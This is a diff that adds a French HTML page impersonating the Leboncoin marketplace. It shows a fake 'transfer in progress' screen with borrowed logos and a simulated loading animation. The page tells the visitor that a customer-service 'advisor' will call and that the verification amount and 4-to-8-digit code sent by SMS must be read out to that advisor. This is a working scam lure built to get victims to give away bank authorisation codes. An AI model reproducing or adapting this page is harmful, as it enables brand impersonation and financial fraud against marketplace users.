@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Virement en cours - Leboncoin</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: white; /* Arrière-plan en blanc */
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start; /* Alignement en haut pour permettre le défilement */
+            min-height: 100vh;
+            position: relative;
+            overflow-y: auto; /* Active la barre de défilement verticale */
+        }
+        .platform {
+            background-color: white;
+            border-radius: 20px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            max-width: 600px;
+            width: 100%;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+            margin-top: 100px; /* Espace pour le logo en haut */
+            margin-bottom: 150px; /* Espace pour le logo en bas */
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 28px;
+        }
+        p {
+            color: #555;
+            font-size: 16px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        .highlight {
+            color: #ff4500; /* Couleur orange pour mettre en évidence */
+            font-weight: bold;
+            background-color: #fff3e0; /* Fond légèrement orangé */
+            padding: 10px;
+            border-radius: 10px;
+            border: 1px solid #ff8c00;
+        }
+        .header-logo {
+            position: fixed; /* Fixé en arrière-plan */
+            top: 0; /* Positionné en haut de la page */
+            left: 0;
+            width: 100%; /* Étendu sur toute la largeur */
+            height: 80px; /* Hauteur réduite */
+            object-fit: cover; /* Ajuste l'image pour couvrir la largeur */
+            z-index: 0; /* Place le logo en arrière-plan */
+            filter: contrast(1.2); /* Augmente le contraste du logo */
+        }
+        .footer-logo {
+            position: fixed; /* Fixé en arrière-plan */
+            bottom: 0; /* Positionné en bas de la page */
+            left: 0;
+            width: 100%; /* Étendu sur toute la largeur */
+            height: auto;
+            z-index: 0; /* Place le logo en arrière-plan */
+            opacity: 0.8; /* Rend le logo légèrement transparent */
+        }
+        .animation-container {
+            position: relative;
+            width: 160px;
+            height: 160px;
+            margin: 30px auto;
+        }
+        .animation-transfer {
+            width: 160px;
+            height: 160px;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .animation-transfer img {
+            width: 80px;
+            height: 80px;
+            animation: transfer 2s infinite ease-in-out;
+        }
+        @keyframes transfer {
+            0%, 100% {
+                transform: translateX(0) scale(1);
+                opacity: 1;
+            }
+            50% {
+                transform: translateX(40px) scale(0.8);
+                opacity: 0.6;
+            }
+        }
+        .animation-transfer::before,
+        .animation-transfer::after {
+            content: '';
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            background-color: #007bff;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite ease-in-out;
+        }
+        .animation-transfer::before {
+            left: 0;
+            animation-delay: 0s;
+        }
+        .animation-transfer::after {
+            right: 0;
+            animation-delay: 0.75s;
+        }
+        @keyframes pulse {
+            0%, 100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+            50% {
+                transform: scale(1.5);
+                opacity: 0.5;
+            }
+        }
+        .btn-return {
+            display: inline-block;
+            margin-top: 20px;
+            padding: 12px 24px;
+            background-color: #007bff; /* Bouton bleu */
+            color: white;
+            text-decoration: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+        }
+        .btn-return:hover {
+            background-color: #0056b3; /* Bleu plus foncé au survol */
+            transform: translateY(-2px);
+        }
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 24px;
+            color: #007BFF;
+            z-index: 1000;
+            display: none;
+            flex-direction: column;
+        }
+        .loading-screen img {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 20px;
+            animation: spin 1.5s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <!-- Logo en haut, étendu sur toute la largeur et en arrière-plan -->
+    <img src="https://github.com/zapata225/lebon/blob/main/Capture%20d%E2%80%99%C3%A9cran%202025-02-24%20110632.png?raw=true" alt="Logo LeBoncoin" class="header-logo">
+
+    <!-- Plateforme de paiement -->
+    <div class="platform">
+        <h1>VIREMENT EN COURS.</h1>
+        
+        <!-- Animation de virement en cours -->
+        <div class="animation-container">
+            <div class="animation-transfer">
+                <img src="https://cdn-icons-png.flaticon.com/512/3135/3135679.png" alt="Icône de virement">
+            </div>
+        </div>
+
+        <p>Suite aux nouvelles mesures de sécurité, vous serez crédité sur votre compte qu’après avoir confirmé que vous êtes bien le titulaire du compte bancaire enregistré sur votre compte Leboncoin.</p>
+        <p>Pour terminer la confirmation de votre compte : vous serez contacté par téléphone par le service client dans les meilleurs délais.</p>
+        <p class="highlight">
+            En validant votre compte bancaire, vous autorisez Leboncoin à vous envoyer un SMS contenant un montant de vérification, déterminé automatiquement, ainsi qu’un code à 4 ou 8 chiffres.<br><br>
+            Ce montant, quelle que soit sa valeur, sert uniquement à vérifier votre compte et devra être communiqué à notre conseiller pour finaliser la confirmation.
+        </p>
+        <p>La confirmation de votre compte bancaire vous permet de prouver que vous êtes bien le titulaire de la carte bancaire enregistrée puisque vous seul avez accès au code Leboncoin.</p>
+        <p>Cordialement,<br>Leboncoin.</p>
+        <p>©1999-2025 Leboncoin. Tous droits réservés.</p>
+
+        <!-- Bouton "Retour à l'accueil" -->
+        <a href="https://www.leboncoin.fr" class="btn-return">Retour à l'accueil</a>
+    </div>
+
+    <!-- Logo en bas, étendu sur toute la largeur -->
+    <img src="https://raw.githubusercontent.com/zapata225/lebon/refs/heads/main/Capture%20d%E2%80%99%C3%A9cran%202025-02-24%20115029.png" alt="Logo LeBoncoin Bas" class="footer-logo">
+
+    <!-- Écran de chargement -->
+    <div class="loading-screen" id="loading-screen">
+        <img src="https://cdn-icons-png.flaticon.com/512/4208/4208427.png" alt="Logo de chargement">
+        Virement en cours...
+    </div>
+
+    <script>
+        // Simuler un virement en cours
+        const loadingScreen = document.getElementById('loading-screen');
+        loadingScreen.style.display = 'flex';
+
+        // Message de confirmation après 5 secondes
+        setTimeout(() => {
+            loadingScreen.style.display = 'none';
+            alert('Virement en attente de confirmation...  '); // Message de confirmation
+        }, 5000);
+    </script>
+</body>
+</html>
